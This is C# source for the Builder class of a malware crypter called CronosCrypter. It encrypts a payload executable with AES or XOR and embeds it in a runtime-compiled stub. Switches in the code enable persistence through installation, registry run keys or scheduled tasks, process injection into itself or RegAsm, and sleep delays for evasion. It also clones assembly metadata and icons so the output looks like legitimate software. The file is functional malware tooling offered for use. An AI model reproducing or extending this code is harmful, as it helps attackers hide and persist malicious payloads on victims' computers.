using CronosCrypter.Core;
using CronosCrypter.Obfuscator;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CronosCrypter.Builder
{
    class Builder
    {
        private Settings _settings;
        public Builder(Settings settings)
        {
            _settings = settings;
        }
        public bool Build()
        {
            _settings.decryptKey = Randomize.RandomString(10);
            _settings.resourceName = Randomize.RandomString(10);

            byte[] payload = File.ReadAllBytes(_settings.payloadName);
            
            string updatedStub = Replace(Properties.Resources.Stub);
            byte[] enc = Encryption.Encrypt(payload, _settings.encryptionType , _settings.decryptKey);
            _settings.encryptedPayload = enc.ToString();
            _settings.encryptedPayload = Convert.ToBase64String(enc);

            File.Create(_settings.resourceName).Close();

            File.WriteAllText(_settings.resourceName, _settings.encryptedPayload);
            File.WriteAllBytes(_settings.resourceName, enc);

            CompilerParameters compParams = this.GenerateCompilerParams();
            compParams.EmbeddedResources.Add(this._settings.resourceName);

            CompilerResults Results = new CSharpCodeProvider().CompileAssemblyFromSource(compParams, updatedStub);

            File.Delete(this._settings.resourceName);

            if (Results.Errors.Count > 0)
            {
                Console.WriteLine("Found error {0} in {1}",
                updatedStub, Results.PathToAssembly);
                foreach (CompilerError ce in Results.Errors)
                {
                    Console.WriteLine("  {0}", ce.ToString());
                    Console.WriteLine();
                }
                MessageBox.Show("Found errors while encrypting");
                Environment.Exit(1);
            }
            else
            {
                MessageBox.Show("Succesfully encrypted file!");
            }


            return true;
        }
        private CompilerParameters GenerateCompilerParams()
        {
            if (_settings.assemblyInfo.usingAssembly == true)
            {
                string iconPath = "\"" + _settings.assemblyInfo.iconPath + "\"";
                return new CompilerParameters
                {
                    GenerateExecutable = true,
                    TreatWarningsAsErrors = false,
                    OutputAssembly = _settings.buildDirectory,
                    CompilerOptions = "/optimize- /platform:x86 /unsafe /target:winexe" + iconPath,
                    ReferencedAssemblies =
                    {
                        "System.dll",
                        "System.Windows.Forms.dll"
                    }
                };
            }
            else
            {
                return new CompilerParameters
                {
                    GenerateExecutable = true,
                    TreatWarningsAsErrors = false,
                    OutputAssembly = _settings.buildDirectory,
                    CompilerOptions = "/optimize- /platform:x86 /unsafe /target:winexe",
                    ReferencedAssemblies =
                    {
                        "System.dll",
                        "System.Windows.Forms.dll"
                    }
                };
            }
        }

        private string Replace(string stub)
        {
            // General
            stub = stub.Replace("[KEY]", _settings.decryptKey);
            stub = stub.Replace("[INJECTION]", _settings.injectionType);
            stub = stub.Replace("[PAYLOAD]", _settings.payloadName);
            stub = stub.Replace("[RES]", _settings.resourceName);

            // Startup
            if (_settings.doInstall == true)
                stub = stub.Replace("//#define INSTALL", "#define INSTALL");

            if (_settings.doRegedit == true)
                stub = stub.Replace("//#define REGEDIT", "#define REGEDIT");

            if (_settings.doSchtasks == true)
                stub = stub.Replace("//#define SCHTASKS", "#define SCHTASKS");

            stub = stub.Replace("[FILENAME]", _settings.fileName + ".exe");
            stub = stub.Replace("[SPECIAL]", _settings.specialDir);
            stub = stub.Replace("[FOLDERNAME]", @"" + _settings.folderName + @"");
            stub = stub.Replace("[REGEDIT]", _settings.regeditName);
            stub = stub.Replace("[SCHTASKS]", _settings.schtasksName);

            // Assembly cloner
            stub = stub.Replace("[AssemblyTitle]", this._settings.assemblyInfo.assemblyTitle);
            stub = stub.Replace("[AssemblyDescription]", this._settings.assemblyInfo.assemblyDescription);
            stub = stub.Replace("[AssemblyProduct]", this._settings.assemblyInfo.assemblyProductName);
            stub = stub.Replace("[AssemblyCompany]", this._settings.assemblyInfo.assemblyCompany);
            stub = stub.Replace("[AssemblyCopyright]", this._settings.assemblyInfo.assemblyCopyright);
            stub = stub.Replace("[AssemblyTrademark]", this._settings.assemblyInfo.assemblyCopyright);
            stub = stub.Replace("[AssemblyVersion]", this._settings.assemblyInfo.assemblyVersion ?? "1.0.0.0");
            stub = stub.Replace("[Guid]", Guid.NewGuid().ToString());

            // Encryption type
            EncryptionType encryptionType = _settings.encryptionType;

            if (encryptionType == EncryptionType.AES)
            {
                stub = stub.Replace("//#define AES", "#define AES");
            }
            else
            {
                stub = stub.Replace("//#define XOR", "#define XOR");
            }

            // Injection type
            if(_settings.injectionName == "Itself")
            {
                stub = stub.Replace("//#define ITSELF", "#define ITSELF");
            }
            else
            {
                stub = stub.Replace("//#define REGASM", "#define REGASM");
            }

            // Settings
            if(_settings.doSleep == true)
            {
                stub = stub.Replace("[SLEEP]", _settings.sleep.ToString());
                stub = stub.Replace("//#define SLEEP", "#define SLEEP");
            }

            return stub;
        }
    }
}
